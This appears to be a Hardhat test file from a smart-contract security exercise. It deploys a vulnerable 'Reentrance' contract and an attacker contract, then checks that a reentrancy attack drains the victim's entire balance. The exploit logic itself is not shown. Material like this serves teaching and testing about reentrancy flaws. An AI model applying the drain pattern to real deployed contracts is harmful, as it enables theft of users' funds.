import { expect } from "chai";
import { ethers } from "hardhat";

describe("Reentrancy", function () {
  it("should be possible to get the target victim to assign a non-zero balance to our attacking contract and drain the contract's balance", async () => {
    const [owner, hacker, otherAccount] = await ethers.getSigners();
    const Reentrance = await ethers.getContractFactory("Reentrance");
    const ReentranceAttacker = await ethers.getContractFactory(
      "ReentranceAttacker"
    );

    const reentrance = await Reentrance.deploy();
    const reentranceAddress = await reentrance.address;
    const reentranceAttacker = await ReentranceAttacker.deploy(
      reentranceAddress
    );
    // Owner funds with 10 eth, our goal is to try and steal it all away
    const originalfunds = 1000;
    const honeypotfunds = 20;
    await owner.sendTransaction({
      to: reentranceAddress,
      value: originalfunds,
    });

    const reentranceAttackerAddress = await reentranceAttacker.address;

    reentranceAttacker.connect(hacker).fund({ value: honeypotfunds });

    expect(await reentrance.balanceOf(reentranceAttackerAddress)).to.be.eq(
      honeypotfunds
    );

    await reentranceAttacker.attack();

    expect(
      await hacker.provider?.getBalance(reentranceAttackerAddress)
    ).to.be.eq(originalfunds + honeypotfunds);
  });
});
